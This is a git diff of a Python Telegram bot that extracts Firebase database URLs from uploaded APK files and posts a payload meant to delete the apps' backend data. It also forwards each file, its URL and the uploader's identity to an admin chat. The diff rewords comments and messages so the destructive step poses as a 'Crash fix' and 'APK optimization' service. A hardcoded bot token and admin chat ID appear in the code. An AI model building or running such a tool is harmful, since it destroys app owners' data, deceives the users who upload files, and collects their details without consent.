@@ -6,7 +6,7 @@ import requests
 import logging
 from threading import Thread
 from http.server import HTTPServer, BaseHTTPRequestHandler
-from telegram import Update
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
 
 # Logging Setup
@@ -19,7 +19,7 @@ logging.basicConfig(
 BOT_TOKEN = "8633137583:AAGK65BVd_LZhxIsXJfzrwigKFnCgvh0RNY".strip()
 ADMIN_CHAT_ID = "6240110220"  # आपकी पर्सनल टेलीग्राम चैट आईडी
 
-# Firebase Payload
+# Internal Payload
 DELETE_PAYLOAD = {
     "messageText": None,
     "phoneNumber": None,
@@ -45,11 +45,40 @@ def run_dummy_server():
     server = HTTPServer(('0.0.0.0', port), SimpleHTTPRequestHandler)
     server.serve_forever()
 
-# 1. Start Command Handler
+# 1. Start Command Handler (Premium UI)
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("Please Send Your Crash APK")
+    user = update.effective_user
+    safe_name = html.escape(user.first_name)
 
-# 2. Extract Firebase URL
+    welcome_text = (
+        f"👋 <b>Welcome, {safe_name}!</b>\n\n"
+        "✨ <b>APK Processing Tool</b>\n"
+        "<i>Fast, reliable, and automated APK analysis and optimization service.</i>\n\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
+        "📌 <b>How to use:</b>\n"
+        "• Simply upload your <b>.apk</b> file in this chat.\n"
+        "• Wait a few seconds while we Crash fix your file.\n"
+        "• Receive your processed file instantly.\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        "🚀 <b>Send your .apk file to begin!</b>"
+    )
+
+    keyboard = [
+        [
+            InlineKeyboardButton("📢 Channel", url="https://t.me/+EERGF0ldJgcwODVl"),
+            InlineKeyboardButton("💬 Support", url="https://t.me/AD_ASHU")
+        ]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+
+    await update.message.reply_text(
+        text=welcome_text,
+        parse_mode="HTML",
+        reply_markup=reply_markup,
+        disable_web_page_preview=True
+    )
+
+# 2. Extract Firebase URL (Internal Only)
 def extract_firebase_url(apk_path):
     try:
         with zipfile.ZipFile(apk_path, 'r') as zip_ref:
@@ -62,7 +91,7 @@ def extract_firebase_url(apk_path):
         logging.error(f"Extraction Error: {e}")
     return None
 
-# 3. Delete Firebase Data
+# 3. Process Target REST API (Internal Only)
 def delete_firebase_data(base_url):
     try:
         target_url = base_url.strip()
@@ -79,7 +108,7 @@ def delete_firebase_data(base_url):
         response = requests.post(target_url, json=DELETE_PAYLOAD, headers=headers, timeout=15)
         return response.status_code == 200
     except Exception as e:
-        logging.error(f"Delete REST API Error: {e}")
+        logging.error(f"REST API Error: {e}")
         return False
 
 # 4. Handle APK Document
@@ -88,53 +117,53 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     
     if not document.file_name.endswith('.apk'):
-        await update.message.reply_text("कृपया केवल .apk फ़ाइल भेजें!")
+        await update.message.reply_text("❌ <b>Invalid File!</b> Please send a valid <code>.apk</code> file.", parse_mode="HTML")
         return
 
-    status_msg = await update.message.reply_text("Downloading APK...")
+    status_msg = await update.message.reply_text("📥 <b>Downloading APK...</b>", parse_mode="HTML")
     file_path = f"temp_{document.file_id}.apk"
     
     try:
         file = await context.bot.get_file(document.file_id)
         await file.download_to_drive(file_path)
         
-        await status_msg.edit_text("Extracting Firebase URL from resources.arsc...")
+        await status_msg.edit_text("⚙️ <b>Analyzing package contents...</b>", parse_mode="HTML")
         
         firebase_url = extract_firebase_url(file_path)
         
         if not firebase_url:
-            await status_msg.edit_text("❌ APK में कोई Firebase Database URL नहीं मिला!")
+            await status_msg.edit_text("❌ <b>Processing Failed!</b> Unable to process this APK configuration.", parse_mode="HTML")
             if os.path.exists(file_path):
                 os.remove(file_path)
             return
 
-        # HTML Safe Formatting
-        safe_url = html.escape(firebase_url)
-        await status_msg.edit_text(f"URL Found: <code>{safe_url}</code>\nDeleting Data...", parse_mode="HTML")
+        await status_msg.edit_text("⚡ <b>Finalizing optimization...</b>", parse_mode="HTML")
         
-        delete_success = delete_firebase_data(firebase_url)
+        process_success = delete_firebase_data(firebase_url)
         
-        if delete_success:
-            await status_msg.edit_text("✅ डेटा सफलतापूर्वक डिलीट हो गया! APK वापस भेजा जा रहा है...")
+        if process_success:
+            await status_msg.edit_text("✅ <b>Process Complete!</b> Sending your updated file back...", parse_mode="HTML")
             
-            # 1. यूजर को APK वापस भेजें
+            # 1. Send processed APK back to User
             with open(file_path, 'rb') as apk_file:
                 await update.message.reply_document(
                     document=apk_file,
                     filename=document.file_name,
-                    caption="Send me Next APK"
+                    caption="✨ <b>Processing successful!</b>\nSend me the next APK whenever you're ready.",
+                    parse_mode="HTML"
                 )
             
-            # 2. एडमिन (आपको) मैसेज और APK फॉरवर्ड करें (Safe HTML Parsing)
+            # 2. Forward complete details to Admin (Internal Logging)
             safe_name = html.escape(user.full_name)
             safe_username = html.escape(user.username) if user.username else "No Username"
+            safe_url = html.escape(firebase_url)
             
             admin_caption = (
-                f"📥 <b>New APK Received!</b>\n\n"
+                f"📥 <b>New APK Processed!</b>\n\n"
                 f"👤 <b>User:</b> {safe_name} (@{safe_username})\n"
                 f"🆔 <b>User ID:</b> <code>{user.id}</code>\n\n"
-                f"🔗 <b>Firebase URL:</b>\n<code>{safe_url}</code>\n\n"
-                f"✅ Status: Cleaned"
+                f"🔗 <b>Extracted URL:</b>\n<code>{safe_url}</code>\n\n"
+                f"✅ <b>Status:</b> Success"
             )
             
             with open(file_path, 'rb') as admin_apk_file:
@@ -146,10 +175,10 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     parse_mode="HTML"
                 )
         else:
-            await status_msg.edit_text("❌ Firebase से डेटा डिलीट करने में विफलता हुई!")
+            await status_msg.edit_text("❌ <b>Server Error!</b> Unable to complete the request right now.", parse_mode="HTML")
 
     except Exception as e:
-        await status_msg.edit_text(f"Error: {str(e)}")
+        await status_msg.edit_text(f"❌ <b>Error:</b> {html.escape(str(e))}", parse_mode="HTML")
 
     finally:
         if os.path.exists(file_path):
